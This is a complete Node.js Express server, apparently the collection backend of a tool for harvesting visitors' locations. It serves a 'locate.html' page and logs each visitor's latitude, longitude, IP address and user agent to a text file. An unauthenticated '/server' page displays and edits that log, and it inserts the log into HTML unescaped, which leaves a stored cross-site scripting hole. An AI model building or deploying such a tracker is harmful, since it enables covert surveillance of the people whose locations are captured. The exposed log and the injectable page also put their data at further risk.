const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Enable parsing of URL-encoded data for our form submission
app.use(express.urlencoded({ extended: true }));

// Serve static files (locate.html, etc.) from the current directory
app.use(express.static(path.join(__dirname)));

// Serve locate.html at the root URL to prevent "Cannot GET /" error on Render
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "locate.html"));
});

// Store endpoint — replaces store.php
app.get("/store", (req, res) => {
    const { lat, long, uagent } = req.query;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const timestamp = new Date().toLocaleString();

    if (!lat || !long) {
        return res.status(400).json({ error: "Missing lat or long" });
    }

    const data =
        "=== Location Data ===\n" +
        "Latitude:    " + lat + "\n" +
        "Longitude:   " + long + "\n" +
        "IP:          " + ip + "\n" +
        "User Agent:  " + (uagent || "N/A") + "\n" +
        "Timestamp:   " + timestamp + "\n" +
        "============================\n\n";

    // Append to location.txt (creates file if it doesn't exist)
    const filePath = path.join(__dirname, "location.txt");

    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error("❌ Error writing file:", err);
            return res.status(500).json({ error: "Failed to save location" });
        }

        console.log("✅ Location saved:");
        console.log("   Lat:", lat, "| Long:", long, "| IP:", ip);

        res.json({ success: true, message: "Location saved!" });
    });
});

// Endpoint to view and edit saved locations
app.get("/server", (req, res) => {
    const filePath = path.join(__dirname, "location.txt");
    let content = "No location data recorded yet.";
    if (fs.existsSync(filePath)) {
        content = fs.readFileSync(filePath, "utf8");
    }
    
    // Serve an HTML page with a textarea instead of a static file
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Server Logs</title>
            <style>
                body { font-family: 'Segoe UI', sans-serif; padding: 20px; background: #0a0a0a; color: #fff; }
                textarea { width: 100%; height: 75vh; font-family: monospace; padding: 15px; background: #1a1a1a; color: #00ff00; border: 1px solid #333; resize: vertical; border-radius: 8px; }
                button { padding: 12px 24px; font-size: 16px; margin-top: 15px; cursor: pointer; background: #6366f1; color: white; border: none; border-radius: 8px; font-weight: bold; }
                button:hover { background: #4f46e5; }
            </style>
        </head>
        <body>
            <h2>📡 Location Logs (Editable)</h2>
            <form action="/server" method="POST">
                <textarea name="logContent">${content}</textarea>
                <br>
                <button type="submit">💾 Save Changes</button>
            </form>
        </body>
        </html>
    `);
});

// Endpoint to handle saving the edited text
app.post("/server", (req, res) => {
    const filePath = path.join(__dirname, "location.txt");
    const newContent = req.body.logContent || "";
    fs.writeFileSync(filePath, newContent, "utf8");
    res.redirect("/server"); // Reload the page after saving
});

app.listen(PORT, () => {
    console.log("================================================");
    console.log("  🌍 Geolocate Server Running!");
    console.log("  📡 Open: http://localhost:" + PORT + "/locate.html");
    console.log("================================================");
});
